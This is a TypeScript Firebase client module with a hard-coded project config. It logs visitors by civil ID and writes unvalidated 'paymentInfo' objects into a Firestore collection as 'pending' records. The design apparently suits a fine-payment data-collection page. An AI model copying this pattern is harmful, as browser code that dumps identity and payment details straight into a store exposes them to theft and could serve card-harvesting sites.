import {
  collection,
  addDoc,
  serverTimestamp,
  setDoc,
  doc,
  getFirestore,
} from "firebase/firestore";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
  authDomain: "adsapp-for.firebaseapp.com",
  projectId: "adsapp-for",
  storageBucket: "adsapp-for.firebasestorage.app",
  messagingSenderId: "282166621415",
  appId: "1:282166621415:web:2be67338bc64233153de42",
  measurementId: "G-PG5NPD4FES"

};

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const datatabas = getDatabase(app);

interface VisitorData {
  civilId: string;
  timestamp: any;
  userAgent: string;
  violations?: any[];
}

export async function logVisitor(civilId: string): Promise<string> {
  try {
    const visitorRef = await addDoc(collection(db, "visitors"), {
      civilId,
      timestamp: serverTimestamp(),
      userAgent: navigator.userAgent,
    } as VisitorData);

    return visitorRef.id;
  } catch (error) {
    console.error("Error logging visitor:", error);
    throw error;
  }
}

export async function addData(data: any) {
  const country = localStorage.getItem('country')
  let id = ''

  if (data.id) {
    localStorage.setItem("visitor", data.id);
    id = data.id
  } else {
    id = localStorage.getItem('visitor')!
  }
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      { ...data, createdDate: new Date().toISOString() },
      { merge: true }
    );

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        {
          ...paymentInfo,
          status: "pending",
          createdDate: new Date().toISOString(),
        },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
